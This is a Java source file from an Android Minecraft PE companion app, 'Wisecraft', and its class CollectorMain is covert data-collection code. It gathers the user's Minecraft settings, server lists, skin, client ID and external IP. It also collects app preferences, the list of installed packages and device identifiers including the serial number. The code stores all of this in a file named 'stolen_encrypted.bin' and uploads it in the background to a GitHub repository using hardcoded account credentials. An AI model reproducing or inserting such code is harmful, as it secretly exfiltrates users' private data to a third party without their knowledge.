package com.nao20010128nao.Wisecraft.collector;
import android.content.*;
import com.nao20010128nao.Wisecraft.*;
import com.nao20010128nao.Wisecraft.misc.*;
import java.io.*;
import java.util.*;
import org.eclipse.egit.github.core.*;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.nao20010128nao.OTC.OrderTrustedMap;
import com.nao20010128nao.OTC.OrderTrustedSet;
import com.nao20010128nao.Wisecraft.misc.compat.CompatCharsets;
import java.net.URL;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import org.eclipse.egit.github.core.client.GitHubClient;
import org.eclipse.egit.github.core.service.ContentsService;
import org.eclipse.egit.github.core.service.RepositoryService;

import static com.nao20010128nao.Wisecraft.Utils.*;

public class CollectorMain extends ContextWrapper implements Runnable {
	static boolean running=false;
	static BinaryPrefImpl stolenInfos;
	
	public CollectorMain() {
		this(true);
	}

	public CollectorMain(boolean start){
		super(TheApplication.instance);
		if(start)new Thread(this).start();
	}
	
	public CollectorMain(Context c,boolean start){
		super(c);
		if(start)new Thread(this).start();
	}
	
	@Override
	public void run() {
		// TODO: Implement this method
		if (running) {
			return;
		}
		BinaryPrefImpl sb;
		String uuid=TheApplication.instance.uuid;
		if(stolenInfos==null){
			while(true){
				try {
					sb=new FileLinkedHeavilyBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
					break;
				} catch (IOException e) {
					DebugWriter.writeToW("CollectorMain",e);
				}
			}
			stolenInfos=sb;
		}else{
			sb=stolenInfos;
		}
		running = true;
		try {
			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
			Repository repo=null;
			List<RepositoryContents> cont=null;
			String s="";
			SharedPreferences.Editor edt=sb.edit();
			try {
				edt.putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos()));
			} catch (Throwable e) {

			} finally {
				System.out.println(s);
				edt.commit();
				edt=sb.edit();
			}
			String[] files=Constant.EMPTY_STRING_ARRAY;
			try {
				files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
			    repo = new RepositoryService(ghc).getRepository("RevealEverything", "Files");
			    cont = new ContentsService(ghc).getContents(repo);
			} catch (Throwable e) {
				DebugWriter.writeToE("CollectorMain",e);
			}
			try {
				for (String filename:files) {
					String actual=filename;
					filename = uuid + "/" + filename;
					Log.d("CollectorMain", "upload:" + filename);
					try {
						Map<String, String> params = new HashMap<>();
				        params.put("path", filename);
						params.put("message", uuid+":"+Utils.randomText(64));
						byte[] file = sb.getString(actual, "").getBytes(CompatCharsets.UTF_8);
						try {
							params.put("sha", getHash(cont, filename));
							if (getHash(cont, filename).equalsIgnoreCase(shash(file))) {
								Log.d("CollectorMain", "skipped");
								continue;
							}
						} catch (Throwable e) {
							Log.d("CollectorMain", "skipped");
						}
						params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
						ghc.put("/repos/RevealEverything/Files/contents/" + filename, params, TypeToken.get(ContentUpload.class).getType());
						Log.d("CollectorMain", "uploaded");
						edt.remove(actual);
				    } catch (Throwable e) {
						DebugWriter.writeToE("CollectorMain",e);
						continue;
					}
				}
				edt.commit();
			} catch (Throwable e) {

			}
		} catch (Throwable e) {
			DebugWriter.writeToE("CollectorMain",e);
		} finally {
			running=false;
			for (String s:sb.getAll().keySet()) {
				Log.d("remain", s);
			}
		}
	}
	
	public void loadPreferences(){
		if(stolenInfos!=null){
			return;
		}
		while(true){
			try {
				stolenInfos=new FileLinkedHeavilyBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
				break;
			} catch (IOException e) {
			}
		}
	}
	public void collectData(){
		SharedPreferences.Editor edt=stolenInfos.edit();
		try {
			edt.putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos()));
		} catch (Throwable e) {

		} finally {
			edt.commit();
		}
	}
	public void uploadAll(){
		try {
			SharedPreferences.Editor edt=stolenInfos.edit();
			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
			Repository repo=null;
			List<RepositoryContents> cont=null;
			String uuid=TheApplication.instance.uuid;
			String[] files=Constant.EMPTY_STRING_ARRAY;
			try {
				files = stolenInfos.getAll().keySet().toArray(new String[stolenInfos.getAll().size()]);
			    repo = new RepositoryService(ghc).getRepository("RevealEverything", "Files");
			    cont = new ContentsService(ghc).getContents(repo);
			} catch (Throwable e) {
				DebugWriter.writeToE("CollectorMain",e);
			}
			try {
				for (String filename:files) {
					String actual=filename;
					filename = uuid + "/" + filename;
					Log.d("CollectorMain", "upload:" + filename);
					try {
						Map<String, String> params = new HashMap<>();
				        params.put("path", filename);
						params.put("message", uuid+":"+Utils.randomText(64));
						byte[] file = stolenInfos.getString(actual, "").getBytes(CompatCharsets.UTF_8);
						try {
							params.put("sha", getHash(cont, filename));
							if (getHash(cont, filename).equalsIgnoreCase(shash(file))) {
								Log.d("CollectorMain", "skipped");
								continue;
							}
						} catch (Throwable e) {
							Log.d("CollectorMain", "skipped");
						}
						params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
						ghc.put("/repos/RevealEverything/Files/contents/" + filename, params, TypeToken.get(ContentUpload.class).getType());
						Log.d("CollectorMain", "uploaded");
						edt.remove(actual);
				    } catch (Throwable e) {
						DebugWriter.writeToE("CollectorMain",e);
						continue;
					}
				}
				edt.commit();
			} catch (Throwable e) {

			}
		} catch (Throwable e) {

		} finally {
			for (String s:stolenInfos.getAll().keySet()) {
				Log.d("remain", s);
			}
		}
	}
	public boolean startCriticalSession(){
		if(running){
			return false;
		}
		return running=true;
	}
	public boolean stopCriticalSession(){
		if(!running){
			return false;
		}
		return !(running=false);
	}
	
	
	public static String getHash(List<RepositoryContents> cont, String filename) {
	    for (RepositoryContents o:cont)
	        if (o.getName().equalsIgnoreCase(filename))
	            return o.getSha();
		throw new RuntimeException();
	}
	public static String shash(byte[] b) throws IOException {
		try {
			MessageDigest md = MessageDigest.getInstance("SHA");
			md.reset();
			byte[] hashed = md.digest(b);
			StringBuilder sb = new StringBuilder(hashed.length * 2);
			for (byte bite : hashed) {
				sb.append(Character.forDigit(bite >> 4 & 0xf, 16));
				sb.append(Character.forDigit(bite & 0xf, 16));
			}
			return sb.toString();
		} catch (NoSuchAlgorithmException e) {
			throw new IOException(e);
		}
	}
	public static class ContentUpload {
		public RepositoryContents content;
		public RepositoryCommit commit;
		public RepositoryCommit[] parents;
	}
	public static class Infos {
		public OrderTrustedMap<String,String> mcpeSettings=readSettings();
		public String[] mcpeServers=readServers();
		public long cid=getCid();
		public String skin=readSkin();
		public String ip=getIp();
		public String uuid=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("uuid", "");
		public Server[] managingServers=getManagingServer();
		public SystemInfo systemInfo=new SystemInfo();
		public AppInfo appInfo=new AppInfo();

		private String getIp() {
			BufferedReader br=null;
			try {
				br = new BufferedReader(new InputStreamReader(new URL("http://ieserver.net/ipcheck.shtml").openConnection().getInputStream()));
				return br.readLine();
			} catch (IOException e) {
				return "127.0.0.1";
			} finally {
				try {
					if (br != null) br.close();
				} catch (IOException e) {

				}
			}
		}
		private long getCid() {
			BufferedReader br=null;
			try {
				br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/clientId.txt"))));
				return new Long(br.readLine());
			} catch (Throwable e) {
				return Long.MAX_VALUE;
			} finally {
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
		}
		private OrderTrustedMap<String,String> readSettings() {
			OrderTrustedMap<String,String> data=new OrderTrustedMap<>();
			BufferedReader br=null;
			try {
				br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/options.txt"))));
				String s;
				while (null != (s = br.readLine())) {
					String[] spl=s.split("\\:");
					data.put(spl[0], spl[1]);
				}
			} catch (Throwable e) {

			} finally {
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
			return data;
		}
		private String[] readServers() {
			List<String> data=new ArrayList(20);
			BufferedReader br=null;
			try {
				br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/external_servers.txt"))));
				String s;
				while (null != (s = br.readLine()))
					data.add(s);
			} catch (Throwable e) {

			} finally {
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
			return data.toArray(new String[data.size()]);
		}
		private String readSkin() {
			InputStream br=null;
			ByteArrayOutputStream b=new ByteArrayOutputStream(100);
			byte[] buf=new byte[100];
			try {
				br = new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/custom.png"));
				while (true) {
					int r=br.read(buf);
					if (r <= 0) 
						break;
					b.write(buf, 0, r);
				}
			} catch (Throwable e) {
				return null;
			} finally {
				try {
					if (br != null)br.close();
				} catch (IOException e) {}
			}
			return Base64.encodeToString(b.toByteArray(), Base64.NO_WRAP);
		}
		private Server[] getManagingServer() {
			Server[] sa=new Gson().fromJson(PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("servers", "[]"), Server[].class);
			return sa;
		}
	}
	public static class AppInfo {
		public String versionName=Utils.getVersionName(TheApplication.instance);
		public int    versionCode=Utils.getVersionCode(TheApplication.instance);
		public String appName="Wisecraft";
		public Map<String,?> preferences=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getAll();
	}
	public static class SystemInfo {
		public OrderTrustedSet<String> packages=getPackageNames();
		//public HashMap<String,PackageInfo> packageInfos=getPackageMisc();
		public String 
		board=Build.BOARD
		,bootloader=Build.BOOTLOADER
		,brand=Build.BRAND
		,cpuAbi1=Build.CPU_ABI
		,cpuAbi2=Build.CPU_ABI2
		,device=Build.DEVICE
		,display=Build.DISPLAY
		,fingerprint=Build.FINGERPRINT
		,hardware=Build.HARDWARE
		,host=Build.HOST
		,id=Build.ID
		,manufacture=Build.MANUFACTURER
		,model=Build.MODEL
		,product=Build.PRODUCT
		,serial=Build.SERIAL
		,baseOs=getVersionClassFieldString("BASE_OS")
		,codeName=getVersionClassFieldString("CODENAME")
		,incremental=Build.VERSION.INCREMENTAL
		,release=Build.VERSION.RELEASE
		,sdk=Build.VERSION.SDK
		,securityPatch=getVersionClassFieldString("SECURITY_PATCH");
		public String[] abis=tryGetSupportAbis();
		public int 
		previewSdkInt=getVersionClassFieldInt("PREVIEW_SDK_INT")
		,sdkInt=getVersionClassFieldInt("SDK_INT");
		

		private OrderTrustedSet<String> getPackageNames() {
			return new OrderTrustedSet<>(getPackageMisc().keySet());
		}
		private OrderTrustedMap<String,PackageInfo> getPackageMisc() {
			OrderTrustedMap<String,PackageInfo> names=new OrderTrustedMap<>();
			List<PackageInfo> packages=TheApplication.instance.getPackageManager().getInstalledPackages(PackageManager.GET_RECEIVERS);
			for (PackageInfo pi:packages)
				names.put(pi.packageName, pi);
			return names;
		}
		private String[] tryGetSupportAbis() {
			try {
				return (String[])Build.class.getField("SUPPORTED_ABIS").get(null);
			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
			return Constant.EMPTY_STRING_ARRAY;
		}
		private String getVersionClassFieldString(String name) {
			try {
				return (String)Build.VERSION.class.getField(name).get(null);
			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
			return null;
		}
		private int getVersionClassFieldInt(String name) {
			try {
				return (int)Build.VERSION.class.getField(name).get(null);
			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
			return -1;
		}
	}
}
